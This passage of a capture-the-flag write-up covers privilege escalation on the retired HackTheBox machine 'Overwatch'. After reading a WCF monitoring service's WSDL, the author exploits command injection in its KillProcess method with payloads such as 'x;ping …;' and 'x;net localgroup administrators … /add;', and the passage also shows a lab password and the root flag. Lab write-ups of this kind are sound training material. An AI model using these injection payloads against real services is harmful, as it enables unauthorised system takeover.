+StatusCode        : 200
+StatusDescription : OK
+Content           : &lt;HTML lang=&quot;en&quot;&gt;&lt;HEAD&gt;&lt;link rel=&quot;alternate&quot; type=&quot;text/xml&quot; href=&quot;http://overwatch.htb:8000/MonitorService?disco&quot;/&gt;&lt;STYLE type=&quot;text/css&quot;&gt;#content{ FONT-SIZE: 0.7em; PADDING-BOTTOM: 2em; MARGIN-LEFT: ...
+RawContent        : HTTP/1.1 200 OK
+                    Content-Length: 3077
+                    Content-Type: text/html; charset=UTF-8
+                    Date: Sat, 09 May 2026 20:46:37 GMT
+                    Server: Microsoft-HTTPAPI/2.0
+
+                    &lt;HTML lang=&quot;en&quot;&gt;&lt;HEAD&gt;&lt;link rel=&quot;alternate&quot; type=&quot;t...
+Forms             :
+Headers           : {[Content-Length, 3077], [Content-Type, text/html; charset=UTF-8], [Date, Sat, 09 May 2026 20:46:37 GMT], [Server, Microsoft-HTTPAPI/2.0]}
+Images            : {}
+InputFields       : {}
+Links             : {@{outerHTML=&lt;A HREF=&quot;http://overwatch.htb:8000/MonitorService?wsdl&quot;&gt;http://overwatch.htb:8000/MonitorService?wsdl&lt;/A&gt;; tagName=A; HREF=http://overwatch.htb:8000/MonitorService?wsdl}, @{outerHTML=&lt;A
+                    HREF=&quot;http://overwatch.htb:8000/MonitorService?singleWsdl&quot;&gt;http://overwatch.htb:8000/MonitorService?singleWsdl&lt;/A&gt;; tagName=A; HREF=http://overwatch.htb:8000/MonitorService?singleWsdl}}
+ParsedHtml        :
+RawContentLength  : 3077
+
+
+
+*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; 
+</code></pre>
+<p>From the output above, we see that the service exposes a WSDL (Web Services Description Language) file.</p>
+<p>WSDL (Web Services Description Language) is an XML-based language used to describe web services and how to interact with them. <br />
+It defines the operations, messages, data types, and endpoints of a service in a machine-readable format. <br />
+WSDL is commonly used with SOAP to enable clients to discover and call web service functions over a network. <br /></p>
+<pre><code>*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; curl -UseBasicParsing http://overwatch.htb:8000/MonitorService?wsdl
+
+
+StatusCode        : 200
+StatusDescription : OK
+Content           : &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;wsdl:definitions name=&quot;MonitoringService&quot; targetNamespace=&quot;http://tempuri.org/&quot; xmlns:wsdl=&quot;http://schemas.xmlsoap.org/wsdl/&quot; xmlns:wsx=&quot;http://schemas.xmlsoap.o...
+RawContent        : HTTP/1.1 200 OK
+                    Content-Length: 4478
+                    Content-Type: text/xml; charset=UTF-8
+                    Date: Sat, 09 May 2026 20:56:36 GMT
+                    Server: Microsoft-HTTPAPI/2.0
+
+                    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;wsdl:definiti...
+Forms             :
+Headers           : {[Content-Length, 4478], [Content-Type, text/xml; charset=UTF-8], [Date, Sat, 09 May 2026 20:56:36 GMT], [Server, Microsoft-HTTPAPI/2.0]}
+Images            : {}
+InputFields       : {}
+Links             : {}
+ParsedHtml        :
+RawContentLength  : 4478
+</code></pre>
+<p>And from the output above we see that we have some data begging with <code>&lt;?xml</code>.</p>
+<p>If we want to read this data we could get is raw content by using.</p>
+<pre><code>*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; $wsdl=curl -UseBasicParsing http://overwatch.htb:8000/MonitorService?wsdl
+*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; $wsdl.RawContent
+HTTP/1.1 200 OK
+Content-Length: 4478
+Content-Type: text/xml; charset=UTF-8
+Date: Sat, 09 May 2026 20:58:41 GMT
+Server: Microsoft-HTTPAPI/2.0
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;wsdl:definitions name=&quot;MonitoringService&quot; targetNamespace=&quot;http://tempuri.org/&quot; xmlns:wsdl=&quot;http://schemas.xmlsoap.org/wsdl/&quot; xmlns:wsx=&quot;http://schemas.xmlsoap.org/ws/2004/09/mex&quot; xmlns:wsu=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&quot; xmlns:wsa10=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:wsp=&quot;http://schemas.xmlsoap.org/ws/2004/09/policy&quot; xmlns:wsap=&quot;http://schemas.xmlsoap.org/ws/2004/08/addressing/policy&quot; xmlns:msc=&quot;http://schemas.microsoft.com/ws/2005/12/wsdl/contract&quot; xmlns:soap12=&quot;http://schemas.xmlsoap.org/wsdl/soap12/&quot; xmlns:wsa=&quot;http://schemas.xmlsoap.org/ws/2004/08/addressing&quot; xmlns:wsam=&quot;http://www.w3.org/2007/05/addressing/metadata&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:tns=&quot;http://tempuri.org/&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/wsdl/soap/&quot; xmlns:wsaw=&quot;http://www.w3.org/2006/05/addressing/wsdl&quot; xmlns:soapenc=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;wsdl:types&gt;&lt;xsd:schema targetNamespace=&quot;http://tempuri.org/Imports&quot;&gt;&lt;xsd:import schemaLocation=&quot;http://overwatch.htb:8000/MonitorService?xsd=xsd0&quot; namespace=&quot;http://tempuri.org/&quot;/&gt;&lt;xsd:import schemaLocation=&quot;http://overwatch.htb:8000/MonitorService?xsd=xsd1&quot; namespace=&quot;http://schemas.microsoft.com/2003/10/Serialization/&quot;/&gt;&lt;/xsd:schema&gt;&lt;/wsdl:types&gt;&lt;wsdl:message name=&quot;IMonitoringService_StartMonitoring_InputMessage&quot;&gt;&lt;wsdl:part name=&quot;parameters&quot; element=&quot;tns:StartMonitoring&quot;/&gt;&lt;/wsdl:message&gt;&lt;wsdl:message name=&quot;IMonitoringService_StartMonitoring_OutputMessage&quot;&gt;&lt;wsdl:part name=&quot;parameters&quot; element=&quot;tns:StartMonitoringResponse&quot;/&gt;&lt;/wsdl:message&gt;&lt;wsdl:message name=&quot;IMonitoringService_StopMonitoring_InputMessage&quot;&gt;&lt;wsdl:part name=&quot;parameters&quot; element=&quot;tns:StopMonitoring&quot;/&gt;&lt;/wsdl:message&gt;&lt;wsdl:message name=&quot;IMonitoringService_StopMonitoring_OutputMessage&quot;&gt;&lt;wsdl:part name=&quot;parameters&quot; element=&quot;tns:StopMonitoringResponse&quot;/&gt;&lt;/wsdl:message&gt;&lt;wsdl:message name=&quot;IMonitoringService_KillProcess_InputMessage&quot;&gt;&lt;wsdl:part name=&quot;parameters&quot; element=&quot;tns:KillProcess&quot;/&gt;&lt;/wsdl:message&gt;&lt;wsdl:message name=&quot;IMonitoringService_KillProcess_OutputMessage&quot;&gt;&lt;wsdl:part name=&quot;parameters&quot; element=&quot;tns:KillProcessResponse&quot;/&gt;&lt;/wsdl:message&gt;&lt;wsdl:portType name=&quot;IMonitoringService&quot;&gt;&lt;wsdl:operation name=&quot;StartMonitoring&quot;&gt;&lt;wsdl:input wsaw:Action=&quot;http://tempuri.org/IMonitoringService/StartMonitoring&quot; message=&quot;tns:IMonitoringService_StartMonitoring_InputMessage&quot;/&gt;&lt;wsdl:output wsaw:Action=&quot;http://tempuri.org/IMonitoringService/StartMonitoringResponse&quot; message=&quot;tns:IMonitoringService_StartMonitoring_OutputMessage&quot;/&gt;&lt;/wsdl:operation&gt;&lt;wsdl:operation name=&quot;StopMonitoring&quot;&gt;&lt;wsdl:input wsaw:Action=&quot;http://tempuri.org/IMonitoringService/StopMonitoring&quot; message=&quot;tns:IMonitoringService_StopMonitoring_InputMessage&quot;/&gt;&lt;wsdl:output wsaw:Action=&quot;http://tempuri.org/IMonitoringService/StopMonitoringResponse&quot; message=&quot;tns:IMonitoringService_StopMonitoring_OutputMessage&quot;/&gt;&lt;/wsdl:operation&gt;&lt;wsdl:operation name=&quot;KillProcess&quot;&gt;&lt;wsdl:input wsaw:Action=&quot;http://tempuri.org/IMonitoringService/KillProcess&quot; message=&quot;tns:IMonitoringService_KillProcess_InputMessage&quot;/&gt;&lt;wsdl:output wsaw:Action=&quot;http://tempuri.org/IMonitoringService/KillProcessResponse&quot; message=&quot;tns:IMonitoringService_KillProcess_OutputMessage&quot;/&gt;&lt;/wsdl:operation&gt;&lt;/wsdl:portType&gt;&lt;wsdl:binding name=&quot;BasicHttpBinding_IMonitoringService&quot; type=&quot;tns:IMonitoringService&quot;&gt;&lt;soap:binding transport=&quot;http://schemas.xmlsoap.org/soap/http&quot;/&gt;&lt;wsdl:operation name=&quot;StartMonitoring&quot;&gt;&lt;soap:operation soapAction=&quot;http://tempuri.org/IMonitoringService/StartMonitoring&quot; style=&quot;document&quot;/&gt;&lt;wsdl:input&gt;&lt;soap:body use=&quot;literal&quot;/&gt;&lt;/wsdl:input&gt;&lt;wsdl:output&gt;&lt;soap:body use=&quot;literal&quot;/&gt;&lt;/wsdl:output&gt;&lt;/wsdl:operation&gt;&lt;wsdl:operation name=&quot;StopMonitoring&quot;&gt;&lt;soap:operation soapAction=&quot;http://tempuri.org/IMonitoringService/StopMonitoring&quot; style=&quot;document&quot;/&gt;&lt;wsdl:input&gt;&lt;soap:body use=&quot;literal&quot;/&gt;&lt;/wsdl:input&gt;&lt;wsdl:output&gt;&lt;soap:body use=&quot;literal&quot;/&gt;&lt;/wsdl:output&gt;&lt;/wsdl:operation&gt;&lt;wsdl:operation name=&quot;KillProcess&quot;&gt;&lt;soap:operation soapAction=&quot;http://tempuri.org/IMonitoringService/KillProcess&quot; style=&quot;document&quot;/&gt;&lt;wsdl:input&gt;&lt;soap:body use=&quot;literal&quot;/&gt;&lt;/wsdl:input&gt;&lt;wsdl:output&gt;&lt;soap:body use=&quot;literal&quot;/&gt;&lt;/wsdl:output&gt;&lt;/wsdl:operation&gt;&lt;/wsdl:binding&gt;&lt;wsdl:service name=&quot;MonitoringService&quot;&gt;&lt;wsdl:port name=&quot;BasicHttpBinding_IMonitoringService&quot; binding=&quot;tns:BasicHttpBinding_IMonitoringService&quot;&gt;&lt;soap:address location=&quot;http://overwatch.htb:8000/MonitorService&quot;/&gt;&lt;/wsdl:port&gt;&lt;/wsdl:service&gt;&lt;/wsdl:definitions&gt;
+</code></pre>
+<h3>Privilege Escalation</h3>
+<p>Lets go back a bit and inspect the code to view the various operation that are listed in the RawContent.</p>
+                <div class="w-full h-full object-cover">  
+                    <img 
+                        src="images/Pasted image 20260509230857.png" 
+                        class="w-full h-auto object-cover rounded-xl shadow-2xl"
+                        alt="HackTheBox Pirate"
+                   >
+                </div>
+<p>Looking at the KillProcess Module we see that is passing user input <code>processName</code> directly concatenated into a PowerShell command string.</p>
+<p>This allows arbitrary code execution on the system with the privileges of the application.</p>
+<pre><code>*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; $URI = &quot;http://overwatch.htb:8000/MonitorService?wsdl&quot;
+</code></pre>
+<pre><code>*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; $client = New-WebServiceProxy -Uri $URI -NameSpace &quot;WcfProxy&quot;
+</code></pre>
+<p>The <code>New-WebServiceProxy</code> command in PowerShell creates a client proxy to interact with the WCF service at <code>http://overwatch.htb:8000/MonitorService</code> using its WSDL definition. This allows calling methods exposed by the service—such as <code>KillProcess(string)</code>—directly from PowerShell.</p>
+<p>When you use <code>New-WebServiceProxy</code> in PowerShell, it downloads and parses this WSDL to dynamically create a <strong>.NET proxy object</strong> that lets you interact with the remote service as if it were a local object. </p>
+<p>The <code>-Namespace "WcfProxy"</code> parameter assigns a custom namespace to the generated proxy class. By default, PowerShell creates a long, auto-generated namespace (like <code>Microsoft.PowerShell.Commands.NewWebserviceProxy.AutogeneratedTypes...</code>), which can be messy and hard to reference. </p>
+<p>Using a simple namespace like <code>WcfProxy</code>:</p>
+<ul>
+<li>Makes the proxy object easier to reference</li>
+<li>Helps avoid naming conflicts if multiple services are used</li>
+<li>Improves script clarity and maintainability</li>
+</ul>
+<p>Then we start a packet capture using tcpdump on our machine to see if we get remote code execution.</p>
+<p>On the target victim machine we type.</p>
+<pre><code>*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; $client.KillProcess(&quot;x;ping 10.10.15.114;&quot;)
+</code></pre>
+<p>And we get a connection back.</p>
+<pre><code>└─$ sudo tcpdump -i tun0 -n icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+21:16:17.640500 IP 10.129.53.197 &gt; 10.10.15.114: ICMP echo request, id 1, seq 1, length 40
+21:16:17.640575 IP 10.10.15.114 &gt; 10.129.53.197: ICMP echo reply, id 1, seq 1, length 40
+21:16:18.653770 IP 10.129.53.197 &gt; 10.10.15.114: ICMP echo request, id 1, seq 2, length 40
+21:16:18.653785 IP 10.10.15.114 &gt; 10.129.53.197: ICMP echo reply, id 1, seq 2, length 40
+21:16:19.669745 IP 10.129.53.197 &gt; 10.10.15.114: ICMP echo request, id 1, seq 3, length 40
+21:16:19.669766 IP 10.10.15.114 &gt; 10.129.53.197: ICMP echo reply, id 1, seq 3, length 40
+21:16:20.687580 IP 10.129.53.197 &gt; 10.10.15.114: ICMP echo request, id 1, seq 4, length 40
+21:16:20.687612 IP 10.10.15.114 &gt; 10.129.53.197: ICMP echo reply, id 1, seq 4, length 40
+</code></pre>
+<p>Now we could try to get a reverse shell or add a user to the administrator group.</p>
+<pre><code>*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; $client.KillProcess(&quot;x;net localgroup administrators sqlmgmt /add;&quot;)
+
+Error: The term '-Force' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+
+
+
+*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+Domain Admins
+Enterprise Admins
+sqlmgmt
+The command completed successfully.
+</code></pre>
+<pre><code>└─$ evil-winrm -u sqlmgmt -p bIhBbzMMnB82yx -i 10.129.53.197
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; type C:\Users\Administrator\Desktop\root.txt
+46b491d2876c68e3ae9b46fb12b18442
+*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; 
+</code></pre>
+        </div>
+
+        <div class="mt-16 pt-8 border-t border-zinc-700 text-xs text-zinc-400 flex justify-between font-medium">
+            <div>Overwatch • HackTheBox • Retired • May 2026</div>
+            <div>Written by CyberEra</div>
+        </div>
+    </div>
+
+    <footer class="bg-zinc-900/80 py-12 text-center text-zinc-400 text-sm">
+    
+    </footer>
+
+</body>
+</html>
